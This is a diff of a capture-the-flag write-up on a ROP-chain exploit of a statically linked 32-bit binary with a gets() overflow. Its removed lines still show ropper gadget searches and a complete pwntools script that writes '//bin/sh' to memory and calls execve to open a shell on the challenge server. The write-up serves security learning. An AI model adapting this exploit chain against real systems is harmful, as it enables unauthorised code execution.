@@ -15,15 +15,15 @@ First, we download the source code and the binary. Our first step is to analyze 
 
 Key Observations:
 
-    Statically Linked: This is a goldmine. Since all libraries are compiled directly into the binary, we have a massive pool of instructions to use as ROP gadgets. We don't need to leak libc addresses!
+   Statically Linked: This is a goldmine. Since all libraries are compiled directly into the binary, we have a massive pool of instructions to use as ROP gadgets. We don't need to leak libc addresses!
 
-    32-bit LSB: We are working with the x86 architecture.
+32-bit LSB: We are working with the x86 architecture.
 
-    The Vulnerability: Looking at the source code, we see the gets() function.
-    
-
-        Red Flag: gets() does not perform bounds checking. This allows us to overwrite the return address on the stack, leading to a stack-based buffer overflow.
+The Vulnerability: Looking at the source code, we see the gets() function.
 ![image alt](src/source_code.png)
+
+    Red Flag: gets() does not perform bounds checking. This allows us to overwrite the return address on the stack, leading to a stack-based buffer overflow.
+
 
 
 
@@ -49,9 +49,7 @@ Since the string "/bin/sh" isn't in the binary, we need to write it into a writa
 
 Using ropper:
 Bash
-
-ropper --file ropfu --search "mov [edx], eax; ret"
-ropper --file ropfu --search "pop edx; pop ecx; pop eax; ret"
+![image alt](src/ropper.png)
 
 2. Preparing the Syscall
 
@@ -65,52 +63,21 @@ Phase 4: Constructing the Exploit
 
 We use pwntools to glue these gadgets together. The logic follows these steps:
 
-    Overflow the buffer to reach the return pointer.
+   Overflow the buffer to reach the return pointer.
+   ![image alt](src/gdb.png)
+   
 
-    Chain 1: Use a pop edx; pop eax; ret gadget to put the address of .data into EDX and "//bi" into EAX.
+Chain 1: Use a pop edx; pop eax; ret gadget to put the address of .data into EDX and "//bi" into EAX.
 
-    Chain 2: Use the mov [edx], eax gadget to write the first 4 bytes to memory.
+Chain 2: Use the mov [edx], eax gadget to write the first 4 bytes to memory.
 
-    Chain 3: Repeat for the next 4 bytes ("n/sh").
+Chain 3: Repeat for the next 4 bytes ("n/sh").
 
-    Chain 4: Set EAX=11, EBX=&.data, ECX=0, EDX=0.
+Chain 4: Set EAX=11, EBX=&.data, ECX=0, EDX=0.
 
-    Final Blow: Call int 0x80.
+Final Blow: Call int 0x80.
 
-Python
 
-#!/usr/bin/env python3
-from pwn import *
-
-# Setup
-exe = './ropfu'
-context.binary = exe
-p = remote("saturn.picoctf.net", 63167)
-
-# Addresses found via Ropper/Readelf
-data_section = 0x080e6060 
-pop_edx_ecx_eax = p32(0x0805f7a6) 
-mov_edx_eax = p32(0x080590f2)
-pop_ebx = p32(0x0804901e)
-pop_eax = p32(0x080b073a)
-int_80 = p32(0x0804a3c2)
-
-# Building the Chain
-payload = b"A" * 28 # Offset to EIP
-
-# Write "//bin/sh" to memory
-payload += pop_edx_ecx_eax + p32(data_section) + p32(0) + b"//bi" + mov_edx_eax
-payload += pop_edx_ecx_eax + p32(data_section + 4) + p32(0) + b"n/sh" + mov_edx_eax
-
-# Execve syscall setup
-payload += pop_eax + p32(11)
-payload += pop_ebx + p32(data_section)
-payload += p32(0x08049e29) + p32(0) # pop ecx; ret
-payload += p32(0x080a5a4d) + p32(0) # pop edx; ret
-payload += int_80
-
-p.sendline(payload)
-p.interactive()
 
 Conclusion: The "Real World" Lesson
 
